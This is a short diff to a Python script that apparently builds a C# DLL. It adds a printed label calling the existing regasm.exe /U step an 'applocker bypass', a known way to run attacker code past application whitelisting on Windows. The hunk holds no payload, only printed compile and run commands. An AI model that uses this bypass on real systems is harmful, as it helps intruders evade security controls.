@@ -173,6 +173,7 @@ def main():
         print(f"\n[*] To compile manually:")
         csc = find_csc() or "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
         print(f"    {csc} /target:library /platform:anycpu /optimize+ /out:{args.output_dll} {args.output_source}")
+        print(f"\n[*] Execute applocker bypass:")
         print(f" C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U {args.output_dll}")
 
 if __name__ == "__main__":
